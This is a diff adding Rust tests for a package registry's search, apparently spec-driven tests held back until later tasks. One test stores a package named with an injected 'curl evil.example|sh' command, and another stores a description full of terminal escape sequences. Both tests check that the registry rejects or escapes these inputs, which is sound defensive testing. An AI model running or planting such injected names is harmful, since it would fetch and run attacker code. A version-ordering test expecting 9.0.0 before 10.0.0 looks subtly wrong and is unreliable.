@@ -260,3 +260,62 @@ fn an_unreadable_credential_store_refuses_the_search_once() {
     assert_eq!(error.code, "R012");
     assert!(world.client.calls().is_empty());
 }
+
+const HOSTILE_NAME: &str = "@sdk/greet; curl evil.example|sh";
+
+#[ignore = "flipped by T4"]
+#[specforge_test(behavior = "search_registry", verify = "output is deterministic")]
+fn one_name_found_in_two_registries_is_listed_by_version_precedence() {
+    let world = World::with(&["reg-a", "reg-b"]);
+    world.store("reg-a", "@acme/tool", "9.0.0", "x", false);
+    world.store("reg-b", "@acme/tool", "10.0.0", "x", false);
+
+    let searched = world.registry().search("tool", None).unwrap();
+
+    let versions: Vec<String> = searched
+        .found
+        .iter()
+        .map(|f| f.version.to_string())
+        .collect();
+    assert_eq!(versions, ["9.0.0", "10.0.0"]);
+}
+
+#[ignore = "flipped by T4"]
+#[specforge_test(
+    behavior = "search_registry",
+    verify = "a registry serves no stored package whose name is no package name"
+)]
+fn a_stored_name_that_is_no_package_name_is_not_listed() {
+    let world = World::with(&["main"]);
+    world.store("main", HOSTILE_NAME, "9.9.9", "x", false);
+    world.store("main", "@sdk/good", "1.0.0", "x", false);
+
+    let searched = world.registry().search("sdk", None).unwrap();
+
+    assert!(searched.failures.is_empty(), "{searched:?}");
+    let names: Vec<String> = searched.found.iter().map(|f| f.name.to_string()).collect();
+    assert_eq!(names, ["@sdk/good"]);
+}
+
+#[ignore = "flipped by T5"]
+#[specforge_test(
+    behavior = "search_registry",
+    verify = "a hit's description is listed printable, each control character as its escape"
+)]
+fn a_found_description_is_listed_printable() {
+    let world = World::with(&["main"]);
+    world.store(
+        "main",
+        "@sdk/good",
+        "1.0.0",
+        "nice \u{1b}[2J\u{1b}]0;pwned\u{7}",
+        false,
+    );
+
+    let searched = world.registry().search("sdk", None).unwrap();
+
+    assert_eq!(
+        searched.found[0].description,
+        "nice \\u{1b}[2J\\u{1b}]0;pwned\\u{7}"
+    );
+}
